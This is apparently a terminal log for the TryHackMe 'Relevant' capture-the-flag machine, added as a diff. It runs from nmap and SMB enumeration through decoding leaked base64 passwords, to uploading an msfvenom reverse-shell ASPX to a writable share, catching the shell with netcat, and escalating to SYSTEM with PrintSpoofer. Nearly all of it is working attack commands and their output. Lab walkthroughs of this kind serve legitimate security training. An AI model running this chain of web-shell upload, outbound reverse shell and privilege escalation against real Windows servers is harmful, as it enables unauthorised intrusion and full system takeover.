@@ -1,0 +1,295 @@
+
+RECON
+
+root@kali:~/tryhackme/relevant# nmap -sC -sV -p- -vv -oA full 10.10.86.58
+PORT      STATE SERVICE       REASON          VERSION
+80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  syn-ack ttl 127 Windows Server 2016 Standard Evaluation 14393 microsoft-ds
+3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
+| ssl-cert: Subject: commonName=Relevant
+| Issuer: commonName=Relevant
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2020-07-24T23:16:08
+| Not valid after:  2021-01-23T23:16:08
+| MD5:   aa09 9a56 8e66 6a87 ca06 7b93 aeae 7032
+| SHA-1: 46f8 9a48 9216 c45b 555c 6f42 690e 3aa0 a694 dc37
+| -----BEGIN CERTIFICATE-----
+| MIIC1DCCAbygAwIBAgIQQGj7dKFQuZhCRMXsDCZqSTANBgkqhkiG9w0BAQsFADAT
+| MREwDwYDVQQDEwhSZWxldmFudDAeFw0yMDA3MjQyMzE2MDhaFw0yMTAxMjMyMzE2
+| MDhaMBMxETAPBgNVBAMTCFJlbGV2YW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
+| MIIBCgKCAQEAwgTRYzeGLuBEOEmrsMRfOK64fz6PLE3Uw99aXGf0ddBHPjhShmnN
+| sBD0/jDI5hRdZu67I5dJ9YteH++53TMK3NdKSWA66WRrbemRbzxcFhtMffULXgRh
+| aton8AAPtu9R897mEN7po7TGN89pRzADdmBH7X94iphp3YRSoWAG1wdbbPx7WuYh
+| zMqfmtPdWZUkiI3qbyGrlTx/pf5u2P+/3iqBmPZLx+k6GA2VdwU1gocVrnLoz7ss
+| EQV0VMGlbzM3cXI6A7VCnwZ5J62blFI4s1WuWmQsmgfG5IHcwwbjgOdq65eS8MPC
+| nVCl21lPLVuA9YG48cXhlYqCbr7jDNjirwIDAQABoyQwIjATBgNVHSUEDDAKBggr
+| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAEnIUp/K7mlJ
+| ceQqSVVox+9Mnru4U0vL/zh+8foutJNbT65NWz1S7DVnn3vx4CPZ0e4c5IxVJXr2
+| 5p37pvIqY98DdtG+TzUMP0geaXzVbqwFqUNd2w1hSABFrQKJbpvdRErwYr50Ecoe
+| EL6oaGvZ/wf+1X/kTH7VWr+KwwgHX8SgIJh16VgAMv/JPNqJgtKzqgmF5zUYicHS
+| WLmDI20EAB4PkfJ0TQN94GVoS4XaN4X4Tn0a8ab+kMERhOvpdG98UmVQmRgpljl/
+| LTQNKn2jtsUGPSS3CH3Y7r6M9UXGC2FJlt0Beel7oPedOXYxV5xwCSxzZoq+BMS2
+| PPTFdrTQP78=
+|_-----END CERTIFICATE-----
+|_ssl-date: 2020-10-27T20:29:23+00:00; +1s from scanner time.
+49663/tcp open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1h45m01s, deviation: 3h30m02s, median: 0s
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 43704/tcp): CLEAN (Timeout)
+|   Check 2 (port 41500/tcp): CLEAN (Timeout)
+|   Check 3 (port 13178/udp): CLEAN (Timeout)
+|   Check 4 (port 41187/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
+|   Computer name: Relevant
+|   NetBIOS computer name: RELEVANT\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2020-10-27T13:29:27-07:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-10-27 16:29:24
+|_  start_date: 2020-10-27 16:22:43
+
+ENUM SMB
+oot@kali:~/tryhackme/relevant# smbclient -L //10.10.86.58
+WARNING: The "syslog" option is deprecated
+Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	nt4wrksv        Disk      
+Reconnecting with SMB1 for workgroup listing.
+Connection to 10.10.86.58 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Failed to connect with SMB1 -- no workgroup available
+root@kali:~/tryhackme/relevant# smbclient //10.10.86.58/nt4wrksv
+WARNING: The "syslog" option is deprecated
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Sat Jul 25 17:46:04 2020
+  ..                                  D        0  Sat Jul 25 17:46:04 2020
+  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
+
+		7735807 blocks of size 4096. 4951415 blocks available
+smb: \> get passwords.txt
+getting file \passwords.txt of size 98 as passwords.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
+smb: \> exit
+root@kali:~/tryhackme/relevant# cat passwords.txt
+[User Passwords - Encoded]
+Qm9iIC0gIVBAJCRXMHJEITEyMw==
+QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+
+DECRYPT PASSWORD
+root@kali:~/tryhackme/relevant# echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
+Bob - !P@$$W0rD!123
+root@kali:~/tryhackme/relevant# echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
+Bill - Juw4nnaM4n420696969!$$$
+
+TEST PASSWORD
+root@kali:~/tryhackme/relevant# psexec.py Bob:'!P@$$W0rD!123'@10.10.86.58
+Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.86.58.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+[*] Found writable share nt4wrksv
+[*] Uploading file AMOEwPqO.exe
+[*] Opening SVCManager on 10.10.86.58.....
+[-] Error opening SVCManager on 10.10.86.58.....
+[-] Error performing the installation, cleaning up: Unable to open SVCManager
+
+
+
+ENUM WEB 
+root@kali:~/tryhackme/relevant# python3 /root/dirsearch/dirsearch.py -u http://10.10.86.58:49663 -x 400,500 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e asp,php,html,aspx
+
+ _|. _ _  _  _  _ _|_    v0.3.9
+(_||| _) (/_(_|| (_| )
+
+Extensions: asp, php, html, aspx | HTTP method: get | Threads: 10 | Wordlist size: 220521
+
+Error Log: /root/dirsearch/logs/errors-20-10-28_09-58-19.log
+
+Target: http://10.10.86.58:49663
+
+[09:58:19] Starting: 
+[09:58:20] 200 -  703B  - /
+[10:14:09] 301 -  158B  - /nt4wrksv  ->  http://10.10.86.58:49663/nt4wrksv/
+
+http://10.10.86.58:49663/nt4wrksv/passwords.txt
+[User Passwords - Encoded]
+Qm9iIC0gIVBAJCRXMHJEITEyMw==
+QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+
+ENUM SMB
+
+root@kali:~/tryhackme/relevant# smbclient //10.10.86.58/nt4wrksv
+WARNING: The "syslog" option is deprecated
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Sat Jul 25 17:46:04 2020
+  ..                                  D        0  Sat Jul 25 17:46:04 2020
+  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
+
+		7735807 blocks of size 4096. 5137554 blocks available
+smb: \> put test.txt
+putting file test.txt as \test.txt (0.1 kb/s) (average 0.1 kb/s)
+smb: \> dir
+  .                                   D        0  Wed Oct 28 16:15:35 2020
+  ..                                  D        0  Wed Oct 28 16:15:35 2020
+  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
+  test.txt                            A        5  Wed Oct 28 16:15:35 2020
+
+		7735807 blocks of size 4096. 5137554 blocks available
+smb: \> 
+
+CHECK FILE ON WEBSERVER
+http://10.10.86.58:49663/nt4wrksv/test.txt
+test
+
+CREATE REVERSE SHELL PAYLOAD (WIN2016 SERVER SO x64)
+root@kali:~/tryhackme/relevant# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.10.169 LPORT=53 -f aspx -o shell.aspx
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 460 bytes
+Final size of aspx file: 3398 bytes
+Saved as: shell.aspx
+
+
+
+UPLOAD TO SMB SHARE
+root@kali:~/tryhackme/relevant# smbclient //10.10.86.58/nt4wrksv
+WARNING: The "syslog" option is deprecated
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Wed Oct 28 16:32:59 2020
+  ..                                  D        0  Wed Oct 28 16:32:59 2020
+  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
+  test.txt                            A        5  Wed Oct 28 16:15:35 2020
+
+		7735807 blocks of size 4096. 5137438 blocks available
+smb: \> put shell.aspx
+putting file shell.aspx as \shell.aspx (94.8 kb/s) (average 65.2 kb/s)
+smb: \> dir
+  .                                   D        0  Wed Oct 28 16:33:51 2020
+  ..                                  D        0  Wed Oct 28 16:33:51 2020
+  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
+  shell.aspx                          A     3398  Wed Oct 28 16:33:51 2020
+  test.txt                            A        5  Wed Oct 28 16:15:35 2020
+
+		7735807 blocks of size 4096. 5137437 blocks available
+smb: \> 
+
+START LISTENER
+root@kali:~/tryhackme/relevant# nc -lvp 53
+listening on [any] 53 ...
+
+GET LOW PRIV REVERSE SHELL
+http://10.10.86.58:49663/nt4wrksv/shell.aspx
+
+root@kali:~/tryhackme/relevant# nc -lvp 53
+listening on [any] 53 ...
+10.10.86.58: inverse host lookup failed: Unknown host
+connect to [10.11.10.169] from (UNKNOWN) [10.10.86.58] 49917
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>whoami
+whoami
+iis apppool\defaultapppool
+
+c:\windows\system32\inetsrv>
+
+PRIVESC
+Windows 2016 Server 
+
+TRANSFER PRINTSPOOFER
+mb: \> put PrintSpoofer.exe
+putting file PrintSpoofer.exe as \PrintSpoofer.exe (234.5 kb/s) (average 173.4 kb/s)
+smb: \> dir
+  .                                   D        0  Wed Oct 28 17:09:24 2020
+  ..                                  D        0  Wed Oct 28 17:09:24 2020
+  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
+  PrintSpoofer.exe                    A    27136  Wed Oct 28 17:09:24 2020
+  shell.aspx                          A     3398  Wed Oct 28 17:09:07 2020
+  test.txt                            A        5  Wed Oct 28 17:08:53 2020
+
+		7735807 blocks of size 4096. 4950839 blocks available
+
+
+GET ROOT SHELL
+c:\windows\system32\inetsrv>cd C:\inetpub\wwwroot\nt4wrksv
+cd C:\inetpub\wwwroot\nt4wrksv
+
+C:\inetpub\wwwroot\nt4wrksv>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is AC3C-5CB5
+
+ Directory of C:\inetpub\wwwroot\nt4wrksv
+
+10/28/2020  02:09 PM    <DIR>          .
+10/28/2020  02:09 PM    <DIR>          ..
+07/25/2020  08:15 AM                98 passwords.txt
+10/28/2020  02:09 PM            27,136 PrintSpoofer.exe
+10/28/2020  02:09 PM             3,398 shell.aspx
+10/28/2020  02:08 PM                 5 test.txt
+               4 File(s)         30,637 bytes
+               2 Dir(s)  20,269,064,192 bytes free
+
+C:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
+PrintSpoofer.exe -i -c cmd
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+USER FLAG
+C:\Windows\system32>type C:\Users\Bob\Desktop\user.txt
+type C:\Users\Bob\Desktop\user.txt
+
+
+ROOT FLAG
+C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
+type C:\Users\Administrator\Desktop\root.txt
+
+
